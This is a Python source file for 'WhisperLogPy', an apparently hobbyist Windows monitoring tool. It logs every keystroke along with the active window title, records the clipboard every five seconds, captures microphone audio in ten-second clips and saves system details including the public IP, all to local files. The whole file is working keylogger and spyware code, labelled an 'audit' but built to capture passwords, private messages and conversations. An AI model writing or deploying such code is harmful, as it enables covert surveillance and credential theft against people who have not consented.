import numpy as np
import os
import socket
import platform
import requests
import threading
import time
from datetime import datetime



# Hardware/Media modules
import sounddevice as sd
from scipy.io.wavfile import write
import win32clipboard
import pygetwindow as gw # Required for Industry Standard context

# Input modules
from pynput.keyboard import Key, Listener

# --- Configuration & State ---
stop_event = threading.Event()
current_window = [None] # Use list to allow mutation inside threads

folder_path = os.path.dirname(os.path.abspath(__file__))
system_info_path = os.path.join(folder_path, "system.txt")
clipboard_path = os.path.join(folder_path, "clipboard.txt")
keys_path = os.path.join(folder_path, "key_log.txt")

BANNER = r"""
 __        __  _       _                _           
 \ \      / / | |__   (_)_ __   ___ _ __| | ___  ___ 
  \ \ /\ / /  | '_ \  | | '_ \ / _ \ '__| |/ _ \/ __|
   \ V  V /   | | | | | | |_) |  __/ |  | |  __/\__ \
    \_/\_/    |_| |_| |_| .__/ \___|_|  |_|\___||___/
                         |_|        WhisperLogPy
"""

# ---------- Utility ----------
def slow_print(text, delay=0.02):
    for c in text:
        print(c, end="", flush=True)
        time.sleep(delay)
    print()

# --- 1. SYSTEM INFORMATION ---
def get_computer_information():
    with open(system_info_path, "w", encoding="utf-8") as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        
        # External IP (Public)
        try:
            public_ip = requests.get('https://api.ipify.org').text
        except Exception:
            public_ip = "Could not fetch public IP"

        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Internal IP: {ip_address}\n")
        f.write(f"External IP: {public_ip}\n")

# Run this once at the start of your script
get_computer_information()
# --- 2. CLIPBOARD (Timed) ---
def clipboard_monitor():
    last_data = ""
    while not stop_event.is_set():
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            if data != last_data:
                with open(clipboard_path, "a", encoding="utf-8") as f:
                    f.write(f"\n[{datetime.now().strftime('%H:%M:%S')}] {data}\n")
                last_data = data
        except:
            try: win32clipboard.CloseClipboard() 
            except: pass
        time.sleep(5) # Industry standard: Check frequently but not constantly

# --- 3. MICROPHONE (High Quality) ---
# def record_audio():
#     fs = 44100 
#     seconds = 10 
#     while not stop_event.is_set():
#         # Using float32 for higher fidelity
#         myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='float32')
#         sd.wait() 
        
#         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
#         audio_file = os.path.join(folder_path, f"audio_{timestamp}.wav")
#         write(audio_file, fs, myrecording)
        
#         # Stop check after each clip
#         if stop_event.is_set(): break


# --- Configuration ---
FS = 48000  # 48kHz is the industry standard for pro video/audio
CHANNELS = 2 # Stereo
RECORD_SECONDS = 10

def record_audio():
    """Captures and processes high-fidelity audio."""
    while not stop_event.is_set():
        try:
            # 1. Capture at 32-bit float for maximum headroom
            print("[*] Recording High-Fidelity Audio...")
            recording = sd.rec(
                int(RECORD_SECONDS * FS), 
                samplerate=FS, 
                channels=CHANNELS, 
                dtype='float32'
            )
            sd.wait() # Wait for the recording to finish

            # 2. Normalization (World-Class Step)
            # This makes quiet voices loud without 'blowing out' the speakers.
            # We scale the audio so the loudest peak is at 95% of maximum volume.
            max_val = np.max(np.abs(recording))
            if max_val > 0:
                recording = recording / max_val * 0.95

            # 3. Save with High-Precision Formatting
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            audio_file = os.path.join(folder_path, f"audio_{timestamp}.wav")
            
            # Convert back to int16 for the WAV file (standard compatibility)
            # but keep the normalized gain.
            recording_int16 = (recording * 32767).astype(np.int16)
            write(audio_file, FS, recording_int16)
            
            print(f"[+] Audio Saved: {audio_file}")

        except Exception as e:
            print(f"Audio Error: {e}")
        
        # Check if we should stop before starting a new loop
        if stop_event.is_set():
            break
# --- 4. KEYLOGGER (Structured) ---
def on_press(key):
    try:
        # Industry Standard: Detect Active Window
        window = gw.getActiveWindow()
        win_title = window.title if window else "Unknown"
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        with open(keys_path, "a", encoding="utf-8") as f:
            if win_title != current_window[0]:
                current_window[0] = win_title
                f.write(f"\n\n[{timestamp}] --- WINDOW: {win_title} ---\n")
            
            # Format characters
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                mapping = {Key.space: " ", Key.enter: "\n", Key.tab: "\t"}
                f.write(mapping.get(key, f"[{str(key).replace('Key.', '')}]"))
    except Exception as e:
        print(f"Log Error: {e}")

def on_release(key):
    if key == Key.esc:
        print("\n[*] ESC detected. Initiating shutdown...")
        stop_event.set()
        return False # Stops the listener

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    
    slow_print(BANNER, delay=0.005)
    threads = [
        threading.Thread(target=clipboard_monitor),
        threading.Thread(target=record_audio)
    ]

    for t in threads:
        t.start()

    print(f"[*] Audit Active. Logging to {folder_path}")
    print("[!] Press ESC to stop all modules safely.")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Once Listener stops, stop_event is already set. Wait for threads to finish current loop.
    print("[*] Cleaning up threads... please wait.")
    for t in threads:
        t.join(timeout=2)
    print("[*] All modules stopped. Files saved.")